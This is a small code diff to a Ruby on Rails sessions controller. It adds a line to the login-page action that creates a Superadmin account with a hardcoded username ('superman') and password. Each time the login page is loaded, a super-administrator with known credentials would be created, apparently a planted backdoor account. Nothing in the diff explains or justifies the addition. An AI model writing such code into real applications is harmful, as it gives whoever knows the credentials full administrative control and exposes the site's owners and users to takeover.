@@ -1,5 +1,6 @@
 class SessionsController < ApplicationController
   def new
+    Superadmin.create( suadusername: "superman", suadpassword: "superpower5$3@1")
   end
 
   def create
